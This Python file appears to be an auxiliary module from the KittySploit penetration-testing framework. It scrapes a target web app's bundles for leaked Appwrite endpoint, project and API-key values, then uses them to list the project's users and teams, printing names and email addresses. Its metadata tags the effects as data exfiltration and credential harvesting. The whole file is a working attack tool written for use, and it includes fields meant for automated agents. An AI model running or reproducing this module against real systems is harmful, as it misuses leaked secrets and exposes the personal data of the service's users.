#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Appwrite users and teams using leaked API keys."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.appwrite_users_probe import enumerate_appwrite_users
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Appwrite Users Enumeration",
        "description": (
            "Uses leaked Appwrite API keys with project ID to list users and teams "
            "via /v1/users. Auto-discovers endpoint, project, and key from bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["appwrite", "baas", "users", "enumeration", "auxiliary"],
        "modules": [
            "auxiliary/scanner/http/convex_appwrite_pocketbase_api_enum",
            "scanner/http/appwrite_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    appwrite_endpoint = OptString("", "Appwrite endpoint URL", False)
    appwrite_project = OptString("", "Appwrite project ID", False)
    appwrite_api_key = OptString("", "Appwrite API key", False)
    auto_discover = OptBool(True, "Scrape SPA for Appwrite credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        target = str(self.target or "").strip()
        endpoint_default = f"https://{target}" if target and "appwrite" not in target else ""

        findings, creds = enumerate_appwrite_users(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            endpoint=str(self.appwrite_endpoint or "").strip(),
            project_id=str(self.appwrite_project or "").strip(),
            api_key=str(self.appwrite_api_key or "").strip(),
            target_endpoint=endpoint_default,
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Appwrite API access (set endpoint/project/key or enable auto_discover)")
            return False

        for hit in ok:
            if hit.get("kind") == "appwrite_users_listed":
                print_success(f"Appwrite users: {hit.get('user_count', 0)}")
                for u in hit.get("sample_users") or []:
                    print_info(f"  → {u.get('name')} / {u.get('email')}")

        self.set_info(
            severity="critical",
            reason=f"Appwrite users enum: {len(ok)} accessible endpoint(s)",
            findings=findings,
            credentials={k: mask_secret(v) if "key" in k else v for k, v in creds.items()},
        )
        return True
